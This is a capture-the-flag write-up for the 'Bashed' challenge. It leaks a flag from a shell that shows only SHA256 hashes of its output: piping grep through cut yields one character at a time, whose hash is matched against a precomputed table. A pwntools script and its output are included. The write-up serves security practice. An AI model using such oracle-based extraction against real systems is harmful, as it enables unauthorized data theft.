# Bashed
Category: Miscellaneous

## Description
> My friend created an interactive shell and hid a flag on the machine, he says the shell is so protected that even the outputs are sha256 hashed so only people who know the files can view them, see if you can extract the flag

## Solution

Let's connect to the attached service:

```console
root@kali:/media/sf_CTFs/technion/Bashed# nc ctf.cs.technion.ac.il 4014
$ ls -al
b4d84c87064e2171e798dba9bd7694dae32dd70690b545dc267437883161686d
```

We receive what looks like a SHA256 hash of the output. Let's verify it by comparing the output to an expected output such as "No such file or directory":

```console
root@kali:/media/sf_CTFs/technion/Bashed# cat no_such_file
cat: no_such_file: No such file or directory
root@kali:/media/sf_CTFs/technion/Bashed# cat no_such_file 2>&1 | sha256sum
b14135ee8db7625c72e7c6fad248fab0b6afa055223fb9cb889be28efac6233e  -
root@kali:/media/sf_CTFs/technion/Bashed# nc ctf.cs.technion.ac.il 4014
$ cat no_such_file
b14135ee8db7625c72e7c6fad248fab0b6afa055223fb9cb889be28efac6233e
```

This confirms our theory.

Let's assume that we have a command which would output the flag to the shell. Our problem is that we'll just get the SHA256 hash of the flag, which is not so useful. But what if we can get the shell to output just one letter from the flag? We can easily precalculate the SHA256 output for all printable characters and compare it to the output. This way, we'll be able to leak the flag character by character.

We'll use `grep -r -h` and `cut` for that, for example:
```console
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -r cstechnion
fake.txt:cstechnion{fake_flag}
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion
cstechnion{fake_flag}
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion | cut -c 1
c
root@kali:/media/sf_CTFs/technion/Bashed/1# grep -h -r cstechnion | cut -c 2
s
```

Script:
```python
from pwn import *
import hashlib
import string
import itertools

r = remote("ctf.cs.technion.ac.il", 4014)

def get_command_sha256(command):
    r.sendlineafter("$ ", command)
    output = r.recvline()
    return output.decode("ascii").strip()

hash_dict = {}
for c in string.printable:
    digest = hashlib.sha256(f"{c}\n".encode("ascii")).hexdigest()
    hash_dict[digest] = c

flag = ""

for i in itertools.count(start = 1):
    hash = get_command_sha256(f"grep -h -r cstechnion |  cut -c {i}")
    character = hash_dict[hash]
    log.info(f"hash: {hash}, mapped to '{character}'")
    flag += character
    if character == "}":
        break

log.success("Flag: {}".format("".join(flag)))
```

Output:
```console
root@kali:/media/sf_CTFs/technion/Bashed# python3 solve.py
[+] Opening connection to ctf.cs.technion.ac.il on port 4014: Done
[*] hash: a3a5e715f0cc574a73c3f9bebb6bc24f32ffd5b67b387244c2c909da779a1478, mapped to 'c'
[*] hash: cbc80bb5c0c0f8944bf73b3a429505ac5cde16644978bc9a1e74c5755f8ca556, mapped to 's'
[*] hash: fe8edeeb98cc6d3b93cf2d57000254b84bd9eba34b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: a2bbdb2de53523b8099b37013f251546f3d65dbe7a0774fa41af0a4176992fd4, mapped to 'e'
[*] hash: a3a5e715f0cc574a73c3f9bebb6bc24f32ffd5b67b387244c2c909da779a1478, mapped to 'c'
[*] hash: 91ee5e9f42ba3d34e414443b36a27b797a56a47aad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: a4fb621495a0122493b2203591c448903c472e306a1ede54fabad829e01075c0, mapped to 'n'
[*] hash: 50c393f158c3de2db92fa9661bfb00eda5b67c3a777c88524ed3417509631625, mapped to 'i'
[*] hash: 7427d152005f9ed0fa31c76ef9963cf4bb47dce6e2768111d9eb0edbfe59c704, mapped to 'o'
[*] hash: a4fb621495a0122493b2203591c448903c472e306a1ede54fabad829e01075c0, mapped to 'n'
[*] hash: a6fb08fda1acb957b6116bd37811a1fe41a01611c0631edbf786d6889a27a55c, mapped to '{'
[*] hash: 91ee5e9f42ba3d34e414443b36a27b797a56a47aad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: 7de1555df0c2700329e815b93b32c571c3ea54dc967b89e81ab73b9972b72d1d, mapped to '4'
[*] hash: cbc80bb5c0c0f8944bf73b3a429505ac5cde16644978bc9a1e74c5755f8ca556, mapped to 's'
[*] hash: 91ee5e9f42ba3d34e414443b36a27b797a56a47aad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: 4415b7e361fc6f6ba2492adef1f27cfb00d0105e4588177470cecc4214b35284, mapped to '_'
[*] hash: 4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865, mapped to '1'
[*] hash: fe8edeeb98cc6d3b93cf2d57000254b84bd9eba34b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: 4415b7e361fc6f6ba2492adef1f27cfb00d0105e4588177470cecc4214b35284, mapped to '_'
[*] hash: 9a271f2a916b0b6ee6cecb2426f0b3206ef074578be55d9bc94f6f3fe3ab86aa, mapped to '0'
[*] hash: 8e54b0ca18020275e4aef1ca0eb5e197e066c065c1864817652a8a39c55402cd, mapped to 'r'
[*] hash: 4415b7e361fc6f6ba2492adef1f27cfb00d0105e4588177470cecc4214b35284, mapped to '_'
[*] hash: 0263829989b6fd954f72baaf2fc64bc2e2f01d692d4de72986ea808f6e99813f, mapped to 'b'
[*] hash: 87428fc522803d31065e7bce3cf03fe475096631e5e07bbd7a0fde60c4cf25c7, mapped to 'a'
[*] hash: f0b5c2c2211c8d67ed15e75e656c7862d086e9245420892a7de62cd9ec582a06, mapped to '5'
[*] hash: 91ee5e9f42ba3d34e414443b36a27b797a56a47aad6bb1e4c1769e69c77ce0ca, mapped to 'h'
[*] hash: 4415b7e361fc6f6ba2492adef1f27cfb00d0105e4588177470cecc4214b35284, mapped to '_'
[*] hash: 4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865, mapped to '1'
[*] hash: fe8edeeb98cc6d3b93cf2d57000254b84bd9eba34b4df7ce4b87db8b937b7703, mapped to 't'
[*] hash: 412ca345ccf75bf9c0806bce695be8de808b79984251a7a54d202cf6101dd451, mapped to '}'
[+] Flag: cstechnion{h4sh_1t_0r_ba5h_1t}
```